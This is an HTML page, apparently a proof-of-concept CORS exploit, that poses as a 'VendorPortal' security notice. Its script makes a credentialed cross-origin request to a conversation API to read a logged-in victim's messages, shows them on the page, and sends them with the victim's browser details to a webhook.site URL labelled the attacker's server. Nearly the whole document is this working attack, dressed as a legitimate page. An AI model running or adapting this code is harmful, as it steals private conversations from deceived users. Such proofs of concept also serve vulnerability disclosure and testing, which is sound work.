<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Vendor Security Update</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 40px; text-align: center; background-color: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 600px; margin: 0 auto; }
        h2 { color: #2c3e50; }
        #status { color: #e74c3c; font-weight: bold; margin-top: 20px; }
        .logo { font-size: 24px; font-weight: bold; color: #3498db; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">VendorPortal</div>
        <h2>Security Notice & Required Action</h2>
        <p>To ensure the security of your partner account, we are displaying a preview of your recent conversations for verification.</p>
        <p>Please wait while we load this information...</p>
        <p id="status">Initializing secure connection...</p>
    </div>

    <script>
        // 1. Define the TARGET - the vulnerable endpoint
        const targetUrl = 'https://conversation-prod.apigateway.co/conversation.v1.ConversationService/ListMessages';
        const targetData = {
            "filters": {
                "conversationId": "CONVERSATION-4416e3a8-9189-4de7-a414-9f55b9febd0c" 
            },
            "pagingOptions": {
                "pageSize": 40
            }
        };

        // 2. Function to display stolen data ON THE PAGE for immediate proof
        function displayData(stolenData) {
            const statusEl = document.getElementById('status');
            // Convert the stolen data object to a readable JSON string for display
            statusEl.innerHTML = `<strong>Error Fetching Preview:</strong><br><textarea style="width: 100%; height: 100px; font-family: monospace;" readonly>${JSON.stringify(stolenData, null, 2)}</textarea>`;
            console.log("[+] STOLEN DATA:", stolenData);
        }

        // 3. Function to send the stolen data to the attacker's server (webhook.site)
        function exfiltrateData(stolenData) {
            const webhookUrl = 'https://webhook.site/f4a284fa-6957-4439-9ad6-00ffd7b707a9'; // REPLACE WITH YOUR WEBHOOK URL
            const payload = {
                stolenData: stolenData,
                victim: navigator.userAgent,
                time: new Date().toISOString()
            };

            // Use fetch with 'no-cors' to avoid CORS issues during exfiltration.
            // The request might fail silently in the console, but it will often still send.
            fetch(webhookUrl, {
                method: 'POST',
                mode: 'no-cors', // Key for sending data to a different origin without CORS
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).then(() => {
                console.log("[!] Data sent to attacker server.");
            }).catch(err => {
                console.log("[-] Failed to send to attacker server (expected due to no-cors):", err);
            });
        }

        // 4. THE MAIN EXPLOIT
        console.log("[*] Starting malicious CORS request...");
        document.getElementById('status').textContent = 'Connecting to vendor API...';

        fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                // The browser will automatically add the Origin: https://yourusername.github.io header
            },
            credentials: 'include', // CRITICAL: Forces the browser to send cookies for the target domain
            body: JSON.stringify(targetData)
        })
        .then(response => {
            console.log(`[*] Server HTTP Status: ${response.status}`);
            return response.json(); // This only works because the server reflects our Origin!
        })
        .then(data => {
            // 5. SUCCESS! We have read data from a cross-origin, credentialed request.
            console.log("[+] CORS EXPLOIT SUCCESSFUL! Data received:");
            document.getElementById('status').textContent = 'Data received. Processing...';
            
            // Display the data on the page for immediate proof
            displayData(data);
            
            // Try to exfiltrate the data to our remote server
            exfiltrateData(data);
        })
        .catch(error => {
            console.error('[-] Full error details:', error);
            document.getElementById('status').textContent = 'Connection failed. Please ensure you are logged into the Vendor Portal and try again.';
        });
    </script>
</body>
</html>
